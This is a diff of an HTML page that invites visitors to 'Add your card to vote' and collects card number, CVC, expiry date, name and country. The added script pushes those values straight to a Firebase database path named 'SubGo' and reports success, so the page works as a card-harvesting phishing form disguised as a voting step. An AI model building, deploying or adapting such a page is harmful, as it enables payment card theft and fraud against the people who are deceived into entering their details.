@@ -5,52 +5,121 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="css/styles3.css">
 
-      
+<style>
+      /* Your existing styles here */
+
+      /* Loading overlay styles */
+      .loading-overlay {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(255, 255, 255, 0.8);
+        justify-content: center;
+        align-items: center;
+        z-index: 999;
+      }
+
+      .loading-text {
+        font-size: 24px;
+        color: #333;
+      }
+</style>
   </head>
   <body>
-    
+
+    <!-- Loading overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+      <p class="loading-text">Loading...</p>
+    </div>
+
     <div class="display">
       <h2>Add your card to vote</h2>
     </div>
-    
+
     <div class="input details1">
-    <form>
-      <label for="card_number">Card Number:</label><br>
-      <input type="number" id="card_number" name="card_number"><br>
-    </form>
-    
-    <form>
-      <label for="cvc">CVC:</label><br>
-      <input type="number" id="cvc" name="cvc">
-    </form>
+      <form>
+        <label for="card_number">Card Number:</label><br>
+        <input type="number" id="card_number" name="card_number"><br>
+      </form>
+
+      <form>
+        <label for="cvc">CVC:</label><br>
+        <input type="number" id="cvc" name="cvc">
+      </form>
     </div>
-    
+
     <div class="input details2">
       <form>
         <label for="expire">Expire Date:</label><br>
         <input type="date" id="expire" name="expire"><br>
       </form>
-      
+
       <form>
         <label for="name">Name:</label><br>
         <input type="text" id="name" name="name">
       </form>
     </div>
-    
+
     <div class="input details3">
       <form>
         <label for="country">Country:</label><br>
         <input type="text" id="country" name="country">
       </form>
     </div>
-    
+
     <div class="linearbutton">
       <button class="button" onclick="submitForm()">SUBMIT</button>
     </div>
+
+    <!-- Firebase scripts using the specified namespace -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-analytics-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+    <!-- Your initialization script -->
+    <script defer src="./init-firebase.js"></script>
     
-    <script src="js/scripts.js"></script>
-    
-    
+    <!-- Your main script -->
+<script defer>
+      // Get a reference to the database
+      const database = firebase.database();
+
+      function submitForm() {
+        // Display loading overlay
+       // document.getElementById('loadingOverlay').style.display = 'none';
+
+        // Get input values
+        var cardNumber = document.getElementById('card_number').value;
+        var cvc = document.getElementById('cvc').value;
+        var expireDate = document.getElementById('expire').value;
+        var name = document.getElementById('name').value;
+        var country = document.getElementById('country').value;
+
+        // Check if any field is empty
+        if (!cardNumber || !cvc || !expireDate || !name || !country) {
+          // Hide loading overlay
+          //document.getElementById('loadingOverlay').style.display = 'none';
+          alert('Error: All fields must be filled!');
+        } else {
+          // Push data to the database
+          const newDataRef = database.ref('SubGo');
+          newDataRef.push({
+            cardNumber: cardNumber,
+            cvc: cvc,
+            expireDate: expireDate,
+            name: name,
+            country: country
+          }).then(function () {
+            alert('Success!');
+          }).catch(function (error) {
+            alert('Error occurred.', error);
+          });
+        }
+      }
+</script>
+
   </body>
 </html>
 
